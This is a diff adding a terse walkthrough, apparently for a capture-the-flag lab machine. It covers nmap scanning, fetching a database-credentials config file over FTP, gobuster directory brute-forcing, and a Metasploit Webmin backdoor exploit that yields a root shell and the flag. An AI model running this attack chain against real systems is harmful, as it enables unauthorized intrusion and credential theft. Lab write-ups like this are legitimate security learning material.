@@ -1,0 +1,50 @@
+sudo nmap -sS 192.168.160.32
+#open ports
+ftp
+ssh
+http
+snet_sensor_mgmt
+
+#load url http://192.168.160.32:80
+
+httprobe 192.168.160.32
+#a.txt file has the scraped links
+
+sudo nmap -A 192.168.160.32
+#it shows the ftp port is open and we can login to ftp port using ftp
+
+ftp 192.168.160.32
+ftp
+get wc-config.php
+#this file has the username and password for database
+get wc-settings.php
+
+#directory bruteforce with gobuster
+gobuster -u http://192.168.160.32:80/
+
+/javascript
+/phpmyadmin
+#phpmyadmin login page works on webpage url:http://192.168.160.32:80/phpmyadmin
+#we can access the whole database using the phpmyadmin but no use 
+
+#use port 10000 through msfconsole
+
+use unix/webapp/webmin_backdoor
+set lhost localip	
+set rhost 192.168.160.32
+set ssl true
+set forceexploit true
+exploit
+
+#you get a session
+id
+#to show owner of the shell
+cd /root && ls -la
+cd /root && cat flag.txt
+#you got a information
+cd /root && cat info.txt
+#you got a flag
+
+
+
+
